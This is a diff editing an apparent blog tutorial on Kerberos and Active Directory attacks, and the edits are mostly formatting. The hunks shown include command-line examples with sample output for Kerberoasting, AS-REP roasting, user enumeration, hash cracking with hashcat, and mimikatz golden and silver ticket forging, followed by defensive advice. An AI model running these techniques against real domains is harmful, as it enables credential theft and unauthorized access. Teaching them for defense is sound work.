@@ -107,7 +107,7 @@ I will proceed to explain each component of the KDC, so first we have...
 
 The **Authentication Service (AS)** is the component of the KDC, that manages the initial authentication phase by validating principal credentials against a database of known principals. 
 
-Example of a user login to a computer:
+Let's see an example of a user trying to login in and how is the Authentication Service involved:
 
 1. User enters credentials an tries to log in.
    
@@ -139,8 +139,9 @@ In addition to identities and keys, the database also contains **policy informat
  >
  >**For reference please check**  
  >[OS Credential Dumping: NTDS (MITRE | ATT&CK)](https://attack.mitre.org/techniques/T1003/003/)
+ {:. .prompt-info }
 
->**I know what you might be thinking but...**  
+>**I know what you might be thinking however...**  
 >The KDC stores each principal's long‑term secret key, **encrypted under a KDC master key**. This means the database alone isn’t enough to recover those keys.
 >
 >In **Active Directory**, these same secrets are kept in `NTDS.dit`. However, they’re **not** protected by a single KDC master key. Instead, they are encrypted with the **Password Encryption Key (PEK)** and further secured by Windows system-level protection (like **LSA secrets/DPAPI**, which use the system **boot key**). As a result, having just the `NTDS.dit` file is not enough to retrieve a principal’s keys.
@@ -189,7 +190,7 @@ When a user logs in, the system creates an access token for them which contains 
 I will show you an example on what does an SID looks like:
 
 ```powershell
-PS C:\htb> whoami /user
+PS C:\> whoami /user
 
 USER INFORMATION
 ----------------
@@ -550,7 +551,7 @@ However, performing aggressive brute‑forcing can trigger account lockout polic
 #### Using kerbrute
 
 ```bash
-./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
+user@pwnarchive:~$ ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
 
     __             __               __
    / /_____  _____/ /_  _______  __/ /____
@@ -602,7 +603,7 @@ These are credential theft techniques which target weak Kerberos implementations
 
 If **“Do not require Kerberos preauthentication”** setting is enabled, the KDC skips this step and issues a TGT without verifying the client first. While this might be needed for compatibility with older systems or certain applications, it’s generally considered **insecure**, because attackers can request encrypted data and attempt offline brute-force attacks on the account’s password.
 
-it's possible to obtain the TGT for any account that has the "Do not require Kerberos preauthentication" setting enabled.
+it's possible to obtain the TGT for any account that has the "Do not require Kerberos pre-authentication" setting enabled.
 
 AS-REQ Roasting is possible when Kerberos pre-authentication is not configured. This allows anyone to request authentication data for a user. In return, the KDC would provide an AS-REP message. 
 
@@ -622,7 +623,7 @@ In practice, tools such as the Impacket script `GetNPUsers.py` are often used 
 
 ```bash
 # Using Impacket's GetNPUsers
-GetNPUsers.py domain.local/ -no-pass -usersfile users.txt
+user@pwnarchive:~$ GetNPUsers.py domain.local/ -no-pass -usersfile users.txt
 [-] User jsmith requires preauthentication
 [-] User admin requires preauthentication  
 [*] User svc_backup doesn't require preauthentication
@@ -633,7 +634,7 @@ $krb5asrep$23$svc_backup@DOMAIN.LOCAL:a1b2c3d4e5f6a1b2c3d4e5f6a1b2c3d4$a1b2c3d4e
 ##### Crack the hash
 
 ```bash
-hashcat -m 18200 svc_backup.hash rockyou.txt
+user@pwnarchive:~$ hashcat -m 18200 svc_backup.hash rockyou.txt
 ```
 
 If cracked: `Password123`
@@ -661,7 +662,7 @@ Let's say attacker has compromised a regular domain user account (`john.smith`).
 ##### Find Service Accounts (SPNs)
 
 ```bash
-GetUserSPNs.py domain.local/john.smith:Password123 -dc-ip 192.168.1.10 -request
+user@pwnarchive:~$ GetUserSPNs.py domain.local/john.smith:Password123 -dc-ip 192.168.1.10 -request
 ```
 {: .nolineno }
 
@@ -681,7 +682,7 @@ Ticket saved to file: [0;3e7]-2-0-40a50000-john.smith@MSSQLSvc_SQL01.domain.loca
 ##### Crack the Hash
 
 ```bash
-hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
+user@pwnarchive:~$ hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt
 
 **Example cracking output:**
 
@@ -715,7 +716,7 @@ Now the attacker has service account passwords:
 
 ```bash
 # Test SQL service account access
-crackmapexec mssql 192.168.1.20 -u sql_svc -p Password123
+user@pwnarchive:~$ crackmapexec mssql 192.168.1.20 -u sql_svc -p Password123
 
 MSSQL       192.168.1.20   1433  SQL01      [*] Windows Server 2019 Standard 17763 x64 (name:SQL01) (domain:domain.local)
 MSSQL       192.168.1.20   1433  SQL01      [+] domain.local\sql_svc:Password123 (Pwn3d!)
@@ -796,15 +797,15 @@ User : krbtgt
     des_cbc_md5       1234567890abcdef
   * Kerberos Password
     Password : (null)
+```
+{: .nolineno }
 
 **Key Info Captured:**
 
 - **KRBTGT NTLM Hash:** `58e478e135c90b7e78c5c5c5c5c5c5c5`
     
 - **Domain SID:** `S-1-5-21-123456789-1234567890-123456789`
-```
-{: .nolineno }
-
+  
 ##### Create Golden Ticket
 
 Using the captured hash and SID, the attacker forges a Golden Ticket for a fake user "eviladmin".
@@ -828,6 +829,8 @@ Lifetime  : 8/8/2024 10:00:00 AM ; 5/5/2034 10:00:00 AM (10 years)
  * KrbCred generated
 
 Golden ticket for 'eviladmin @ domain.local' successfully submitted for current session.
+```
+{: .nolineno }
 
 **Parameters Explained:**
 
@@ -838,9 +841,7 @@ Golden ticket for 'eviladmin @ domain.local' successfully submitted for current 
 - `/groups:512` – Adds user to Domain Admins group
     
 - `/ptt` – **Pass The Ticket**: Injects ticket directly into current session (no file saved)
-    
-```
-{: .nolineno }
+
 
 ##### Verify Ticket Injection
 
@@ -916,18 +917,17 @@ SID               : S-1-5-21-123456789-1234567890-123456789-1105
      * Domain   : DOMAIN.LOCAL
      * NTLM     : 4b5d5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c
      * SHA1     : 1234567890abcdef1234567890abcdef12345678
+```
+{: .nolineno }
 
-**Key Info Captured:**
+From here we have
 
 - **Target Computer NTLM Hash:** `4b5d5c5c5c5c5c5c5c5c5c5c5c5c5c5c5c`
     
 - **Domain SID:** `S-1-5-21-123456789-1234567890-123456789`
     
 - **Target Computer RID:** `1105` (last part of SID)
-    
-```
-{: .nolineno }
-
+  
 ##### Create Silver Ticket for CIFS (File Share)
 
 The attacker forges a ticket for the CIFS service (used for file shares).
@@ -953,6 +953,8 @@ Lifetime  : 8/8/2024 10:00:00 AM ; 8/9/2024 10:00:00 AM (1 day)
  * KrbCred generated
 
 Silver ticket for 'Administrator @ DOMAIN.LOCAL' to 'cifs @ FILESERVER01.domain.local' successfully submitted for current session.
+```
+{: .nolineno }
 
 **Parameters Explained:**
 
@@ -965,9 +967,7 @@ Silver ticket for 'Administrator @ DOMAIN.LOCAL' to 'cifs @ FILESERVER01.domain.
 - `/target:` – Specific server the ticket works for
     
 - `/ptt` – Injects ticket into current session
-    
-```
-{: .nolineno }
+
 ##### Verify Ticket Injection
 
 ```powershell
@@ -978,10 +978,11 @@ mimikatz # kerberos::list
   Server Name       : cifs/FILESERVER01.domain.local @ DOMAIN.LOCAL
   Client Name       : Administrator @ DOMAIN.LOCAL
   Flags 40a00000    : pre_authent ; initial ; renewable ; forwardable ;
-
-**Note:** Shows as `cifs/FILESERVER01` not `krbtgt/DOMAIN` (unlike Golden Ticket).
 ```
 {: .nolineno }
+
+>here it shows as `cifs/FILESERVER01` not `krbtgt/DOMAIN` (unlike Golden Ticket).
+{: .prompt-info}
 ##### Use Silver Ticket to Access File Server
 
 ```powershell
@@ -996,10 +997,10 @@ C:\> dir \\FILESERVER01.domain.local\C$
 
 C:\> type \\FILESERVER01\C$\Confidential\budget.xlsx
 [File contents displayed - access granted!]
-
-**Success!** The attacker accesses the file share without any domain authentication.
 ```
 {: .nolineno }
+
+Now the attacker accesses the file share without any domain authentication.
 
 ### Delegation attacks
 
@@ -1009,7 +1010,7 @@ Kerberos Delegation enables a service to act on behalf of a user and access anot
 
 Several types of delegation exist, and each contains vulnerabilities that an attacker could exploit to impersonate users and gain access to additional services.
 
-#### 1. Unconstrained delegation
+#### **Unconstrained delegation**
 
 > Impersonate users
 
@@ -1036,7 +1037,7 @@ Unconstrained delegation is not enabled by default and requires high privileges 
 >Due to its inherent risk, modern security practice strongly discourages the use of unconstrained delegation. More secure constrained delegation should be used whenever possible.
 {: prompt-info }
 
-#### 2. Constrained delegation
+#### **Constrained delegation**
 
 > A restrictive version 
 
@@ -1052,7 +1053,7 @@ Constrained delegation is a security mechanism in Active Directory that allows a
 
 - Service accounts **cannot** self-configure delegation privileges
 
-##### Security Improvements Over Unconstrained Delegation
+##### **Security Improvements Over Unconstrained Delegation**
 
 - **Reduced Attack Surface**: Limits lateral movement to only specified services
 
@@ -1060,11 +1061,11 @@ Constrained delegation is a security mechanism in Active Directory that allows a
 
 - **Explicit Authorization**: Each target service must be explicitly listed in the delegation configuration
 
-##### Attack Vectors Against Constrained Delegation
+##### **Attack Vectors Against Constrained Delegation**
 
 Despite being more secure than unconstrained delegation, constrained delegation remains vulnerable to several attack techniques:
 
-### ** Protocol Transition Abuse (S4U2Self/S4U2Proxy Attack)**
+### **Protocol Transition Abuse (S4U2Self/S4U2Proxy Attack)**
 
 An attacker compromises a service account (`WebSvc`) configured for constrained delegation to `SQLSvc/dbserver`.
 
@@ -1076,7 +1077,7 @@ An attacker compromises a service account (`WebSvc`) configured for constrained 
 
 This Allows attackers to impersonate high-privilege users to the delegated services.
 
-##### Resource-Based Constrained Delegation (RBCD) Exploitation
+##### **Resource-Based Constrained Delegation (RBCD) Exploitation**
 
 If an attacker gains write permissions (`GenericWrite`, `GenericAll`) on a computer account (`VictimPC$`) through ACL abuse or group membership.
 
@@ -1093,7 +1094,7 @@ If an attacker gains write permissions (`GenericWrite`, `GenericAll`) on a comp
 
 This enables privilege escalation and lateral movement by reconfiguring delegation settings.
 
-##### Silver Ticket Attacks with Delegation Rights
+##### **Silver Ticket Attacks with Delegation Rights**
 
 If an attacker compromises a service account's password hash.
 
@@ -1121,7 +1122,7 @@ This enables persistence and lateral movement even if the actual service account
 
 ### How to defend
 
-#### Roasting attacks (AS-REQ & Kerberoasting)
+#### **Roasting attacks (AS-REQ & Kerberoasting)**
 
 - **Never disable Kerberos pre‑authentication** on user accounts.
 
@@ -1133,7 +1134,7 @@ This enables persistence and lateral movement even if the actual service account
 
 - **Monitor Event ID 4769** for RC4‑encrypted tickets (Type `0x17`) and unusual request spikes.
 
-#### Delegation attacks
+#### **Delegation attacks**
 
 - **Disable unconstrained delegation** entirely in modern environments.
 
@@ -1143,7 +1144,7 @@ This enables persistence and lateral movement even if the actual service account
 
 - **Audit delegation settings** regularly using tools like `Find-Delegation` (PowerView) or BloodHound.
   
-#### Ticket abuse
+#### **Ticket abuse**
 
 - **Limit the number of privileged accounts** and enforce **least‑privilege** access.
 
